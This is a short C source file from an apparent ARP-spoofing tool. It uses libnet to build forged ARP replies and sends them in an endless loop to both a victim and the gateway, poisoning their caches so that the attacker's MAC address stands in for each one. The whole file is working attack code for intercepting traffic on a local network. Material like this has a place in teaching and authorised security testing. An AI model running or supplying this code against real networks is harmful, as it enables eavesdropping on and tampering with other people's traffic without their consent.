/*
* MODULE: send fake ARP packet to gateway and victim.
* MAIN FUNCTION: Arpspoof
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __ARPSPOOF_H_
#define __ARPSPOOF_H_

#include "head.h"

int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_char *dstIp) {

    /* definations */
    libnet_t *net_t = NULL;
    static u_char padPtr[18];
    char err_buf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ARP */
    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, 6, 4, 2,
    srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_arp error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(dstMac, srcMac, EPT_ARP, padPtr, 0, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_ethernet error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    res = libnet_write(net_t);
    if (res == -1) {
        printf("ARP libnet write error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* success */
    libnet_destroy(net_t);
    return 0;
}

void Arpspoof(void *arg) {
    struct arg real_arg = *(struct arg *)arg;
    while (1) {
        send_fake_ARP(real_arg.dev, ATTACKER_MAC, TARGET_MAC, GATEWAY_IP, TARGET_IP);
        sleep(1);
        send_fake_ARP(real_arg.dev, ATTACKER_MAC, GATEWAY_MAC, TARGET_IP, GATEWAY_IP);
        sleep(1);
    }
}

#endif